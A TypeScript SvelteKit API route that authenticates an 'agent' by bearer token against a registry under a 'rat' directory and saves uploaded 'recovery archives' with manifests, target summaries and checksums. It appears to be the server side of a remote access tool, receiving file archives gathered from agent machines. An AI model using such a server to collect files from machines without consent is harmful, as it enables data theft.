import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { saveRecoveryArchive } from '$lib/server/recovery/storage';
import type {
        RecoveryArchiveDetail,
        RecoveryArchiveManifestEntry,
        RecoveryArchiveTargetSummary
} from '$lib/types/recovery';

function getBearerToken(header: string | null): string | undefined {
        if (!header) {
                return undefined;
        }
        const match = header.match(/^Bearer\s+(.+)$/i);
        return match?.[1]?.trim();
}

function parseJsonField<T>(value: FormDataEntryValue | null): T | undefined {
        if (typeof value !== 'string') {
                return undefined;
        }
        const trimmed = value.trim();
        if (!trimmed) {
                return undefined;
        }
        return JSON.parse(trimmed) as T;
}

export const POST: RequestHandler = async ({ params, request }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        const token = getBearerToken(request.headers.get('authorization'));
        try {
                registry.authorizeAgent(id, token);
        } catch (err) {
                if (err instanceof RegistryError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Authorization failed');
        }

        const form = await request.formData();
        const file = form.get('archive');
        if (!(file instanceof File)) {
                throw error(400, 'Archive data missing');
        }

        const requestIdValue = form.get('requestId');
        if (typeof requestIdValue !== 'string' || requestIdValue.trim() === '') {
                throw error(400, 'Request identifier is required');
        }

        let manifest: RecoveryArchiveManifestEntry[] = [];
        try {
                manifest = parseJsonField<RecoveryArchiveManifestEntry[]>(form.get('manifest')) ?? [];
        } catch {
                throw error(400, 'Invalid manifest payload');
        }

        let targets: RecoveryArchiveTargetSummary[] = [];
        try {
                targets = parseJsonField<RecoveryArchiveTargetSummary[]>(form.get('targets')) ?? [];
        } catch {
                throw error(400, 'Invalid targets payload');
        }

        const sha256Value = form.get('sha256');
        if (typeof sha256Value !== 'string' || sha256Value.trim() === '') {
                throw error(400, 'Archive checksum missing');
        }

        const notesValue = form.get('notes');
        const archiveNameValue = form.get('archiveName');
        const archiveName =
                typeof archiveNameValue === 'string' && archiveNameValue.trim() !== ''
                        ? archiveNameValue.trim()
                        : file.name;

        const buffer = new Uint8Array(await file.arrayBuffer());

        const archive = await saveRecoveryArchive({
                agentId: id,
                requestId: requestIdValue.trim(),
                archiveName,
                data: buffer,
                sha256: sha256Value.trim(),
                manifest,
                targets,
                notes: typeof notesValue === 'string' ? notesValue.trim() || undefined : undefined
        });

        return json({ archive } satisfies { archive: RecoveryArchiveDetail });
};
